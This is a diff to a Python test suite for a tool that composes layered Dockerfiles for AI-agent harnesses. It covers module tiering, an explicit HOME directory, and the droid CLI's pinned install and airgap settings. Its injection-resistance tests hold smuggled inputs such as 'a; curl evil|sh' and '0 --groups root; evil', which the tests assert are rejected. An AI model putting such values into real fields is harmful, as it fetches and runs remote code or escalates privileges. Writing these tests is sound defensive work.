@@ -19,7 +19,8 @@ ALL_MODULES = [
     {"name": "python"},
     {"name": "opencode"},
     {"name": "langfuse"},
-    {"name": "workspace"},
+    {"name": "user"},
+    {"name": "workdir"},
 ]
 
 
@@ -32,8 +33,8 @@ class TestTiering:
 
     def test_modules_are_partitioned_by_stage(self) -> None:
         result = compose(spec(modules=ALL_MODULES))
-        assert result.base.module_names == ("apt", "node", "python")
-        assert result.runtime.module_names == ("opencode", "langfuse", "workspace")
+        assert result.base.module_names == ("apt", "user", "node", "python")
+        assert result.runtime.module_names == ("opencode", "langfuse", "workdir")
 
     def test_base_builds_from_the_spec_base_image(self) -> None:
         result = compose(spec(base_image="debian:trixie-slim"))
@@ -77,7 +78,7 @@ class TestTiering:
     def test_tier_split_is_configurable(self) -> None:
         everything_in_base = compose(spec(modules=ALL_MODULES, tier_split=Stage.USER))
         assert everything_in_base.runtime.module_names == ()
-        assert len(everything_in_base.base.module_names) == 6
+        assert len(everything_in_base.base.module_names) == 7
 
     def test_empty_tier_is_still_a_valid_layer(self) -> None:
         result = compose(spec())
@@ -129,7 +130,7 @@ class TestCompose:
         assert base.index("apt packages") < base.index("python venv")
         runtime = result.runtime.dockerfile
         assert runtime.index("harness: opencode") < runtime.index("langfuse tracing")
-        assert runtime.index("langfuse tracing") < runtime.index("workspace /workspace")
+        assert runtime.index("langfuse tracing") < runtime.index("workdir /workspace")
 
     def test_labels_are_stamped_per_tier(self) -> None:
         result = compose(spec(modules=ALL_MODULES))
@@ -249,8 +250,8 @@ class TestBuiltinModules:
         with pytest.raises(ModuleError, match="at least one package"):
             compose(spec(modules=[{"name": "apt", "packages": []}]))
 
-    def test_workspace_sets_user_last(self) -> None:
-        result = compose(spec(modules=[{"name": "workspace"}]))
+    def test_workdir_sets_user_last(self) -> None:
+        result = compose(spec(modules=[{"name": "user"}, {"name": "workdir"}]))
         lines = [
             line
             for line in result.runtime.dockerfile.splitlines()
@@ -374,11 +375,11 @@ class TestInjectionResistance:
         # ModuleDeclaration allows extra fields without type coercion, so YAML
         # hands the int-annotated uid whatever was written.
         with pytest.raises(ModuleError, match="uid must be an integer"):
-            compose(spec(modules=[{"name": "workspace", "uid": "0 --groups root; evil"}]))
+            compose(spec(modules=[{"name": "user", "uid": "0 --groups root; evil"}]))
 
     def test_injection_via_workspace_user_rejected(self) -> None:
         with pytest.raises(ModuleError, match="unsafe"):
-            compose(spec(modules=[{"name": "workspace", "user": "a; curl evil|sh"}]))
+            compose(spec(modules=[{"name": "user", "user": "a; curl evil|sh"}]))
 
     def test_version_specifiers_are_quoted_not_rejected(self) -> None:
         # `langfuse>=3,<4` is a legitimate pin; quoting keeps it intact and
@@ -399,3 +400,91 @@ class TestInjectionResistance:
 
         with pytest.raises(DockerfileError, match="newline"):
             compose(spec(labels={"a": "1\nUSER root"}))
+
+
+class TestUserAccountHome:
+    """HOME must be explicit, not inferred from /etc/passwd.
+
+    Docker resolves HOME by mapping the uid to the *first* matching name, and
+    --non-unique means two names share uid 1000 on a node base image. `USER
+    agent` therefore yielded HOME=/home/node. Harnesses keep state and
+    credentials under HOME (~/.factory, ~/.local/share/opencode), so a wrong
+    HOME silently sends them somewhere the image never prepared.
+    """
+
+    def test_home_is_set_explicitly(self) -> None:
+        # In the BASE tier: HOME must exist before any harness writes config
+        # into it at Stage.HARNESS.
+        out = compose(spec(modules=[{"name": "user"}])).base.dockerfile
+        assert "ENV HOME=/home/agent" in out
+
+    def test_home_follows_the_user(self) -> None:
+        out = compose(spec(modules=[{"name": "user", "user": "runner"}])).base.dockerfile
+        assert "ENV HOME=/home/runner" in out
+
+    def test_home_is_created_and_owned(self) -> None:
+        out = compose(spec(modules=[{"name": "user"}])).base.dockerfile
+        assert "mkdir -p /home/agent" in out
+        assert "chown -R agent /home/agent" in out
+
+    def test_home_is_in_the_digest(self) -> None:
+        a = compose(spec(modules=[{"name": "user", "user": "a"}])).base.digest
+        b = compose(spec(modules=[{"name": "user", "user": "b"}])).base.digest
+        assert a != b
+
+
+class TestDroid:
+    """Factory's droid CLI, verified against a real container."""
+
+    def test_installed_from_npm_pinned(self) -> None:
+        out = compose(spec(modules=[{"name": "node"}, {"name": "droid"}])).runtime.dockerfile
+        assert "npm install -g droid@0.176.0" in out
+        assert "droid --version" in out
+
+    def test_auto_update_disabled_by_default(self) -> None:
+        # A harness that updates itself inside a container invalidates the
+        # promise its digest makes: same digest, different software.
+        out = compose(spec(modules=[{"name": "node"}, {"name": "droid"}])).runtime.dockerfile
+        assert "FACTORY_DROID_AUTO_UPDATE_ENABLED=false" in out
+
+    def test_auto_update_can_be_re_enabled(self) -> None:
+        out = compose(
+            spec(modules=[{"name": "node"}, {"name": "droid", "auto_update": True}])
+        ).runtime.dockerfile
+        assert "FACTORY_DROID_AUTO_UPDATE_ENABLED" not in out
+
+    def test_airgap_is_on_by_default(self) -> None:
+        # Unlike droid's own default. This runtime runs agents against your own
+        # provider endpoints, where the Factory cloud call is pure failure
+        # surface — and its symptom is a bare "Exec failed".
+        out = compose(spec(modules=[{"name": "node"}, {"name": "droid"}])).runtime.dockerfile
+        assert "FACTORY_AIRGAP_ENABLED=true" in out
+
+    def test_airgap_can_be_turned_off(self) -> None:
+        out = compose(
+            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": False}])
+        ).runtime.dockerfile
+        assert "FACTORY_AIRGAP_ENABLED" not in out
+
+    def test_airgap_enables_byok_without_a_factory_account(self) -> None:
+        # Verified end to end: without this, `droid exec` opens a cloud session
+        # first and dies with 401 before ever calling the custom endpoint.
+        out = compose(
+            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": True}])
+        ).runtime.dockerfile
+        assert "FACTORY_AIRGAP_ENABLED=true" in out
+
+    def test_airgap_changes_the_digest(self) -> None:
+        a = compose(spec(modules=[{"name": "node"}, {"name": "droid"}])).runtime.digest
+        b = compose(
+            spec(modules=[{"name": "node"}, {"name": "droid", "airgap": False}])
+        ).runtime.digest
+        assert a != b
+
+    def test_requires_node(self) -> None:
+        with pytest.raises(ModuleError, match="requires 'node'"):
+            compose(spec(modules=[{"name": "droid"}]))
+
+    def test_lands_in_the_runtime_tier(self) -> None:
+        result = compose(spec(modules=[{"name": "node"}, {"name": "droid"}]))
+        assert result.runtime.module_names == ("droid",)
